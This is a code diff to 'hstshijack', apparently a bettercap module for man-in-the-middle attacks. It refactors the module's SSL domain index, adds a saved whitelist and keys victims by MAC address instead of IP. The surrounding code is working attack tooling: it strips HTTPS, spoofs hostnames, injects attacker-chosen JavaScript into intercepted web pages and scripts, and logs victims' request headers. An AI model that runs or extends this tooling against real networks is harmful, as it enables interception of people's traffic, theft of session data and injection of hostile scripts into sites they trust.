@@ -3,18 +3,21 @@
  */
 
 var ssl = {
-  "domains": [],
+  /* Prefix string mapped array of indexed domains. */
   "index": {},
-  "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz"
+  /* Unicode hierarchy for domain names. */
+  "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz",
+  /* Prefix hierarchy for domain names. */
+  "prefixes": ["www.","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9"],
 };
 
 var payload,
     payload_container_prefix = (
       "if (!globalThis.{{SESSION_ID_TAG}}) {\n" +
-         "globalThis.{{SESSION_ID_TAG}} = function() {\n"),
+        "globalThis.{{SESSION_ID_TAG}} = function() {\n"),
     payload_container_suffix = (
-         "\n}\n" +
-         "globalThis.{{SESSION_ID_TAG}}();\n" +
+        "\n}\n" +
+        "globalThis.{{SESSION_ID_TAG}}();\n" +
       "}\n");
 
 var ignore_hosts       = [],
@@ -46,11 +49,11 @@ var selector_header = /^\s*(.*?)\s*:\s*(.*?)\s*$/,
     selector_strip_whitespace = /^\s*(.*?)\s*$/,
     selector_uri_one = /^https:\/\//i,
     selector_uri_two = /https:\/\/([^:/?#]*).*/i,
-    selector_content_type_js = /\S+[/]javascript/i,
+    selector_content_type_js = /\S+\/javascript/i,
     selector_html_magic = /^\s*</g,
     selector_html_script_open_tag = /<script(\s|>)/ig,
     selector_html_script_close_tag = /<\/script(\s|>)/ig,
-    selector_all_dashes = /\-/g,
+    selector_all_dashes = /-/g,
     selector_all_dots = /\./g,
     selector_scheme_http_https_colon = /(http)s:/ig,
     selector_port_https = /:443($|[^0-9])/g,
@@ -58,22 +61,17 @@ var selector_header = /^\s*(.*?)\s*:\s*(.*?)\s*$/,
     selector_regset_wildcard_two = /\.\*$/,
     selector_regset_wildcard_three = /\.\*$/g,
     selector_regset_wildcard_four = /\.\*/g,
-    selector_query_param = /(^[^=]*)=(.*$)/;
+    selector_query_param = /^([^=]*)=(.*)$/;
 
-var red      = "\033[31m",
-    yellow   = "\033[33m",
-    green    = "\033[32m",
-    blue     = "\033[34m",
-    on_white = "\033[47;30m",
-    on_grey  = "\033[40;37m",
-    on_blue  = "\033[104;30m",
-    bold     = "\033[1;37m",
-    reset    = "\033[0m";
-
-function randomFloat() {
-  r = Math.sin(math_seed++) * 10000;
-  return r - Math.floor(r);
-}
+var red      = "\x1b[31m",
+    yellow   = "\x1b[33m",
+    green    = "\x1b[32m",
+    blue     = "\x1b[34m",
+    on_white = "\x1b[47;30m",
+    on_grey  = "\x1b[40;37m",
+    on_blue  = "\x1b[104;30m",
+    bold     = "\x1b[1;37m",
+    reset    = "\x1b[0m";
 
 function randomString(length) {
   length = parseInt(length);
@@ -170,22 +168,33 @@ function toWholeRegexpSet(selector_string, replacement_string) {
 
 /* Saves the list of domains using SSL, as well as its index ranges. */
 function saveSSLIndex() {
-  writeFile(env["hstshijack.ssl.domains"], ssl.domains.join("\n"));
-  writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index, null, 2));
+  domains = [];
+  for (a = 0; a !== ssl.prefixes.length; a++) {
+    prefix = ssl.prefixes[a];
+    domains = domains.concat(ssl.index[prefix]);
+  }
+  ssl.domains = domains;
+  writeFile(env["hstshijack.ssl.domains"], domains.join("\n"));
+  writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index));
+}
+
+/* Saves the list of domains using SSL, as well as its index ranges. */
+function saveWhitelist() {
+  writeFile(env["hstshijack.whitelist"], JSON.stringify(whitelist));
 }
 
 /* Returns the amount of characters of an identical prefix of two given strings. */
 function getMatchingPrefixLength(string1, string2) {
   count = 0;
   if (string1.length > string2.length) {
-    for (a = 0; a < string2.length; a++) {
+    for (a = 0; a !== string2.length; a++) {
       if (string1.charAt(a) !== string2.charAt(a)) {
         break;
       }
       count++;
     }
   } else {
-    for (a = 0; a < string1.length; a++) {
+    for (a = 0; a !== string1.length; a++) {
       if (string1.charAt(a) !== string2.charAt(a)) {
         break;
       }
@@ -199,7 +208,7 @@ function getMatchingPrefixLength(string1, string2) {
 function getsPrecedence(domain1, domain2) {
   if (domain1.length > domain2.length) {
     /* If the first given domain is longer than the second. */
-    for (a = 0; a < domain2.length; a++) {
+    for (a = 0; a !== domain2.length; a++) {
       rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
       rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
       if (rank1 > rank2) {
@@ -211,7 +220,7 @@ function getsPrecedence(domain1, domain2) {
     return false;
   } else {
     /* If the second given domain is longer than the first. */
-    for (a = 0; a < domain1.length; a++) {
+    for (a = 0; a !== domain1.length; a++) {
       rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));
       rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));
       if (rank1 > rank2) {
@@ -224,131 +233,46 @@ function getsPrecedence(domain1, domain2) {
   }
 }
 
-/* Returns an array with the first and last index of an alphanumeric range of domains.
- * This is the range in which domains are/will be indexed. */
-function getIndexRange(char) {
-  if (index_range = ssl.index[char]) {
-    /* Character is already indexed. */
-    return index_range;
-  } else {
-    /* Character is not yet indexed. */
-    indexed_chars = Object.keys(ssl.index).concat(char).sort();
-    this_char_index = indexed_chars.indexOf(char);
-    if (
-         indexed_chars[this_char_index - 1]
-      && indexed_chars[this_char_index + 1]
-    ) {
-      /* Will not be the first nor last indexed character. */
-      return [
-        ssl.index[indexed_chars[this_char_index + 1]][0],
-        ssl.index[indexed_chars[this_char_index + 1]][0]
-      ];
-    } else if (indexed_chars[this_char_index + 1]) {
-      /* Will be the first indexed character, but not the last. */
-      return [
-        0,
-        ssl.index[indexed_chars[this_char_index + 1]][0]
-      ];
-    } else if (indexed_chars[this_char_index - 1]) {
-      /* Will be the last indexed character, but not the first. */
-      if (ssl.domains.length === 1) {
-        /* Will be the second and last indexed character. */
-        return [
-          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,
-          1
-        ];
-      } else {
-        /* Will be the last but not the second indexed character. */
-        return [
-          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,
-          ssl.domains.length
-        ];
-      }
-    } else {
-      /* Will be the first and last indexed character. */
-      return [0, 0];
-    }
-  }
-}
-
-/* Returns the index of a given domain within a given index range. */
-function getDomainIndex(domain, index_range) {
+/* Returns the index of a given domain. */
+function getDomainIndex(domain) {
   domain = domain.toLowerCase();
-  if (
-       index_range[0] === index_range[1]
-    && domain === ssl.domains[index_range[0]]
-  ) {
-    /* This domain is the only indexed domain with this first character. */
-    return index_range[0];
-  }
-  /* Return this domain's index when found in this index range. */
-  for (a = index_range[0]; a < index_range[1] + 1; a++) {
-    if (domain === ssl.domains[a]) {
-      return a;
+  for (a = 0; a !== ssl.prefixes.length; a++) {
+    prefix = ssl.prefixes[a];
+    if (domain.startsWith(prefix)) {
+      return ssl.index[prefix].indexOf(domain);
     }
   }
-  /* This domain is not indexed. */
-  return -1;
 }
 
 /* Index a new domain. */
 function indexDomain(domain) {
   domain = domain.toLowerCase();
-  first_char = domain.charAt(0);
-  index_range = getIndexRange(first_char);
-  if (getDomainIndex(domain, index_range) === -1) {
+  domain_prefix = "";
+  for (a = 0; a !== ssl.prefixes.length; a++) {
+    prefix = ssl.prefixes[a];
+    if (domain.startsWith(prefix)) {
+      domain_prefix = prefix;
+      break;
+    }
+  }
+  indexed_domains = ssl.index[domain_prefix];
+  if (indexed_domains.indexOf(domain) === -1) {
     /* This domain is not indexed yet. */
     log_debug(on_blue + "hstshijack" + reset + " Indexing domain " + bold + domain + reset + " ...");
-    indexed_chars = Object.keys(ssl.index);
-    if (index_range[0] === index_range[1]) {
-      /* This index range consists of only one index. */
-      if (ssl.domains[index_range[0]]) {
-        /* This index range contains one domain. */
-        new_index = index_range[0];
-        if (getsPrecedence(ssl.domains[index_range[0]], domain)) {
-          new_index++;
+    if (indexed_domains.length !== 0) {
+      for (a = 0; a < indexed_domains.length; a++) {
+        indexed_domain = indexed_domains[a];
+        if (getsPrecedence(domain, indexed_domain)) {
+          ssl.index[domain_prefix] = indexed_domains.slice(0, a)
+            .concat(domain)
+            .concat(indexed_domains.slice(a, indexed_domains.length));
+          saveSSLIndex();
+          return;
         }
-        arr_ = ssl.domains.slice(0, new_index);
-        _arr = ssl.domains.slice(new_index, ssl.domains.length);
-        ssl.domains = [].concat(arr_, [domain], _arr);
-        ssl.index[first_char] = [
-          index_range[0],
-          index_range[1] + 1
-        ];
-      } else {
-        /* This index range contains no domains. */
-        ssl.domains.push(domain);
-        ssl.index[first_char] = [
-          index_range[0],
-          index_range[1]
-        ];
       }
+      ssl.index[domain_prefix].push(domain);
     } else {
-      /* This index range consists of multiple domains. */
-      new_index = index_range[0];
-      for (var a = index_range[0]; a < index_range[1] + 1; a++) {
-        if (!getsPrecedence(domain, ssl.domains[a])) {
-          new_index = a + 1;
-        } else {
-          break;
-        }
-      }
-      arr_ = ssl.domains.slice(0, new_index);
-      _arr = ssl.domains.slice(new_index, ssl.domains.length);
-      ssl.domains = [].concat(arr_, [domain], _arr);
-      ssl.index[first_char] = [
-        index_range[0],
-        index_range[1] + 1
-      ];
-    }
-    remaining_indexed_chars = indexed_chars.slice(index_range[1] + 1);
-    for (a = 0; a < remaining_indexed_chars.length; a++) {
-      indexed_char = remaining_indexed_chars[a];
-      index_range = ssl.index[indexed_char];
-      ssl.index[indexed_char] = [
-        index_range[0] + 1,
-        index_range[1] + 1
-      ];
+      ssl.index[domain_prefix] = [domain];
     }
     saveSSLIndex();
   } else {
@@ -494,9 +418,20 @@ function configure() {
     "var " + varname_replacement_hosts + " = [\"" + replacement_hosts.join("\",\"") + "\"];\n";
   payload_container_suffix = payload_container_suffix.replace(/\{\{SESSION_ID_TAG\}\}/g, session_id);
 
+  /* Prepare whitelist */
+  whitelist_file_path = env["hstshijack.whitelist"];
+  try {
+    whitelist = JSON.parse(readFile(whitelist_file_path));
+  } catch (err) {
+    log_fatal(on_blue + "hstshijack" + reset + " Could not read whitelist file (got " + whitelist_file_path + "). Please enter a valid hstshijack.whitelist value in your caplet.");
+  }
+
   /* Prepare SSL index */
   ssl_index_check = env["hstshijack.ssl.check"].toLowerCase() || "true";
   all_domains = readFile(env["hstshijack.ssl.domains"]).split("\n");
+  for (a = 0; a !== ssl.prefixes.length; a++) {
+    ssl.index[ssl.prefixes[a]] = [];
+  }
   if (all_domains.length === 0) {
     log_info(on_blue + "hstshijack" + reset + " No indexed domains were found, index will be reset.");
   } else {
@@ -513,9 +448,20 @@ function configure() {
       ssl.domains = all_domains;
       index_file_contents = readFile(env["hstshijack.ssl.index"]);
       if (ssl.domains.length !== 0 && index_file_contents === "") {
-        log_fatal(on_blue + "hstshijack" + reset + " List of domains using SSL is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
+        log_fatal(on_blue + "hstshijack" + reset + " List of SSL domains is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
       }
-      ssl.index = JSON.parse(index_file_contents);
+      try {
+        ssl.index = JSON.parse(index_file_contents);
+      } catch (err) {
+        log_fatal(on_blue + "hstshijack" + reset + "(" + err + ") List of SSL domains is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
+      }
+      indexed_domains_length = 0;
+      for (a = 0; a !== ssl.prefixes.length; a++) {
+        indexed_domains_length += ssl.index[ssl.prefixes[a]].length;
+      }
+      if (indexed_domains_length !== all_domains.length) {
+        log_fatal(on_blue + "hstshijack" + reset + " List of SSL domains is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");
+      }
       log_info(on_blue + "hstshijack" + reset + " Skipped SSL index check for " + all_domains.length + " domain(s).");
     }
   }
@@ -590,11 +536,10 @@ function onCommand(cmd) {
     return true;
   }
   if (cmd === "hstshijack.ssl.index") {
-    log_string = "\n" + bold + "  SSL domain index (" + Object.keys(ssl.index).length + ")" + reset + "\n";
-    for (a = 0; a < Object.keys(ssl.index).length; a++) {
-      indexed_char = Object.keys(ssl.index)[a];
-      char_index = ssl.index[indexed_char];
-      log_string += "\n    " + yellow + indexed_char + reset + " (first: " + char_index[0] + ", last: " + char_index[1] + ")";
+    log_string = "\n" + bold + "  SSL domain index" + reset + "\n";
+    for (a = 0; a !== ssl.prefixes.length; a++) {
+      domain_prefix = ssl.prefixes[a];
+      log_string += "\n    " + yellow + domain_prefix + reset + " (length: " + ssl.index[domain_prefix].length + ")";
     }
     console.log(log_string + "\n");
     return true;
@@ -608,7 +553,11 @@ function onCommand(cmd) {
 function onLoad() {
   math_seed = new Date().getMilliseconds();
   Math.random = function() {
-    return randomFloat();
+    r = Math.sin(math_seed++) * 10000;
+    return r - Math.floor(r);
+  }
+  String.prototype.startsWith = function(prefix) {
+    return this.slice(0, prefix.length) === prefix;
   }
 
   log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...");
@@ -633,9 +582,9 @@ function onRequest(req, res) {
       Requests made for this path should include a hostname in the query so
       this module can send a HEAD request to learn HTTPS redirects.
     */
-    log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.IP + reset + " for " + bold + req.Query + reset + ".");
+    log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Query + reset + ".");
     queried_host = req.Query;
-    if (getDomainIndex(queried_host, getIndexRange(queried_host.charAt(0))) === -1) {
+    if (getDomainIndex(queried_host) === -1) {
       log_debug(on_blue + "hstshijack" + reset + " Learning unencrypted HTTP response from " + queried_host + " ...");
       req.Hostname = queried_host;
       req.Path     = "/";
@@ -651,7 +600,7 @@ function onRequest(req, res) {
       Requests made for this path will be printed.
     */
     req.Scheme = "ignore";
-    logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\n";
+    logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Hostname + reset + "\n";
     logStr += "  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n";
     logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_grey + " " + reset + " \n";
     headers = req.Headers.split("\r\n");
@@ -684,7 +633,7 @@ function onRequest(req, res) {
       Requests made for this path will stop all attacks towards this client with the requested hostname.
     */
     req.Scheme = "ignore";
-    logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\n";
+    logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.MAC + reset + " for " + bold + req.Hostname + reset + "\n";
     logStr += "  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query !== "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n";
     logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\n  " + on_white + " " + reset + " \n";
     headers = req.Headers.split("\n");
@@ -710,21 +659,22 @@ function onRequest(req, res) {
     log_info(logStr);
 
     /* Add requested hostname to whitelist. */
-    if (whitelist[req.Client.IP]) {
-      if (whitelist[req.Client.IP].indexOf(req.Hostname) === -1) {
-        whitelist[req.Client.IP].push(req.Hostname);
+    if (whitelist[req.Client.MAC]) {
+      if (whitelist[req.Client.MAC].indexOf(req.Hostname) === -1) {
+        whitelist[req.Client.MAC].push(req.Hostname);
       }
     } else {
-      whitelist[req.Client.IP] = [req.Hostname];
+      whitelist[req.Client.MAC] = [req.Hostname];
     }
     /* Also whitelist unspoofed version of requested hostname. */
     for (a = 0; a < target_hosts.length; a++) {
       whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a]);
       if (whole_regexp_set[0].test(req.Hostname)) {
-        whitelist[req.Client.IP].push(req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]));
+        whitelist[req.Client.MAC].push(req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]));
         break;
       }
     }
+    saveWhitelist();
   } else {
     /*
       Not a callback.
@@ -732,9 +682,9 @@ function onRequest(req, res) {
       Redirect client to the real host if a whitelist callback was received previously.
       Restore spoofed hostnames and schemes in request.
     */
-    if (whitelist[req.Client.IP]) {
-      for (a = 0; a < whitelist[req.Client.IP].length; a++) {
-        whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.IP][a], "");
+    if (whitelist[req.Client.MAC]) {
+      for (a = 0; a < whitelist[req.Client.MAC].length; a++) {
+        whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.MAC][a], "");
         if (whole_regexp_set[0].test(req.Hostname)) {
           /* Restore requested hostname if it was spoofed. */
           var unspoofed_host;
@@ -745,7 +695,7 @@ function onRequest(req, res) {
               query = (req.Query !== "" ? ("?" + req.Query) : "");
               res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);
               res.Status = 301;
-              log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.IP + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");
+              log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.MAC + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");
               return;
             }
           }
@@ -822,7 +772,7 @@ function onRequest(req, res) {
     }
 
     /* Restore HTTPS scheme. */
-    if (getDomainIndex(req.Hostname, getIndexRange(req.Hostname.charAt(0))) !== -1) {
+    if (getDomainIndex(req.Hostname) !== -1) {
       /* Restore HTTPS scheme of request if domain is indexed. */
       if (req.Scheme !== "https") {
         req.Scheme = "https";
@@ -874,9 +824,9 @@ function onResponse(req, res) {
   }
 
   /* Ignore this response if whitelisted. */
-  if (whitelist[req.Client.IP]) {
-    if (whitelist[req.Client.IP].indexOf(req.Hostname) !== -1) {
-      log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset + ".");
+  if (whitelist[req.Client.MAC]) {
+    if (whitelist[req.Client.MAC].indexOf(req.Hostname) !== -1) {
+      log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset + ".");
       return;
     }
   } else {
@@ -937,7 +887,7 @@ function onResponse(req, res) {
             "</script>\n" +
             res.Body;
         }
-        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
+        log_debug(on_blue + "hstshijack" + reset + " Injected document from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset);
       }
     }
 
@@ -968,7 +918,7 @@ function onResponse(req, res) {
       }
       if (injection !== "") {
         res.Body = payload_container_prefix + injection + payload_container_suffix + res.Body;
-        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset);
+        log_debug(on_blue + "hstshijack" + reset + " Injected JavaScript file from " + bold + req.Hostname + reset + " for " + bold + req.Client.MAC + reset);
       }
     }
 
@@ -1050,4 +1000,3 @@ function onResponse(req, res) {
     res.SetHeader("Pragma", "no-cache");
   }
 }
-
